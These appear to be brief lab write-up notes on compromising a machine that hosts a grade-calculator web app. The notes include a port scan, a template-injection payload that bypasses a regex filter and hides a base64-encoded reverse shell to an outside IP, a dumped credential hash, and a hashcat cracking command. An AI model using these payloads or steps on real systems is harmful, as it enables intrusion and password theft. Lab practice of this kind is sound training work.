#ssti

- Enumeration : 
```sh
nmap -sC -sV-p- $ip
```

- Output :
```sh
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Exploitation form ssti RCE / bypass regex filter : 
```ruby
ABCDE%0A<%25%3d+system("echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDI0MiAwPCYxIDI%2bJjE%3d+|+base64+-d+|+bash+")+%25> #payload
```

`"%0A" to bypass the filter and at the same type encode the payload in base64 to also bypass security .`

Interesting file : 
```sh
susan@perfection:~/Migration$ cat pupilpath_credentials.db
cat pupilpath_credentials.db
^ableusersusersCREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
a\
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023fsusan@perfection:~/Migration$ ^C
```

- Cracking the hash : 
```sh
hashcat -m 1400 hash  -a 3 "susan_nasus_?d?d?d?d?d?d?d?d?d"
```

`The structure of the password was in /var/mail`
